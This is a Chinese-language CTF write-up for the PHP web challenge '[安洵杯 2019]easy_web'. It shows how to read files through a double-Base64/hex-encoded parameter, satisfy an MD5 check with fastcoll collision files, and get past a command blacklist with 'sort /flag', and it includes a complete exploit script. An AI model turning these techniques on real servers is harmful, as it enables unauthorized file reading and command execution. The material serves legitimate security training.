# [安洵杯 2019]easy_web

## 题目概述
一道PHP Web题，包含文件读取漏洞和命令执行功能。命令执行需要满足MD5碰撞条件，且存在黑名单过滤。

## 信息收集

访问题目URL，通过`img`参数读取`index.php`源码。`img`参数经过双重Base64解码+hex2bin处理，可读取任意文件（但过滤`flag`关键字）。

```python
import base64, binascii
def encode_filepath(filepath):
    hex_val = binascii.hexlify(filepath.encode()).decode()
    b64_1 = base64.b64encode(hex_val.encode()).decode()
    b64_2 = base64.b64encode(b64_1.encode()).decode()
    return b64_2
```

## 漏洞分析

源码关键逻辑：
1. `img`参数：双重Base64解码→hex2bin→`file_get_contents()`，过滤`flag`关键字
2. `cmd`参数：黑名单过滤大量命令（cat、ls、echo等），需满足MD5碰撞才能执行
3. MD5条件：`(string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])`

黑名单未过滤的命令：`dir`、`sort`、`uniq`、`base64`、`xxd`、`find`、`rev`等

## 利用过程

### Step 1: 生成MD5碰撞文件

使用`fastcoll`工具生成两个不同内容但MD5相同的文件：

```bash
/tmp/fastcoll/fastcoll -o collision_a.bin collision_b.bin
```

验证碰撞：
```python
import hashlib
with open('collision_a.bin', 'rb') as f: a = f.read()
with open('collision_b.bin', 'rb') as f: b = f.read()
print(f"a != b: {a != b}")  # True
print(f"MD5(a): {hashlib.md5(a).hexdigest()}")  # 相同
print(f"MD5(b): {hashlib.md5(b).hexdigest()}")  # 相同
```

### Step 2: 命令执行读取Flag

使用未被过滤的`sort`命令读取`/flag`文件：

```python
import requests

url = "http://target/index.php"
params = {'img': 'TXpVek5UTTFNbVUzTURabE5qYz0', 'cmd': 'sort /flag'}
data = {'a': open('collision_a.bin', 'rb').read(), 'b': open('collision_b.bin', 'rb').read()}
r = requests.post(url, params=params, data=data)
# 输出: flag{50500929-6702-421f-af34-763cb4499362}
```

## 复现脚本

```python
import requests
import hashlib

# 生成MD5碰撞（需预先用fastcoll生成）
# /tmp/fastcoll/fastcoll -o collision_a.bin collision_b.bin

url = "http://8d50493b-0bf8-4c06-9f08-2917b4890186.node5.buuoj.cn:81/"

with open('collision_a.bin', 'rb') as f: a = f.read()
with open('collision_b.bin', 'rb') as f: b = f.read()

# 验证碰撞有效
assert a != b, "Files must be different"
assert hashlib.md5(a).hexdigest() == hashlib.md5(b).hexdigest(), "MD5 must match"

# 执行命令读取flag
params = {'img': 'TXpVek5UTTFNbVUzTURabE5qYz0', 'cmd': 'sort /flag'}
data = {'a': a, 'b': b}
r = requests.post(url, params=params, data=data)

# 提取输出
output = r.text.split('<br>')[2].split('<html>')[0].strip()
print(output)
# flag{50500929-6702-421f-af34-763cb4499362}
```
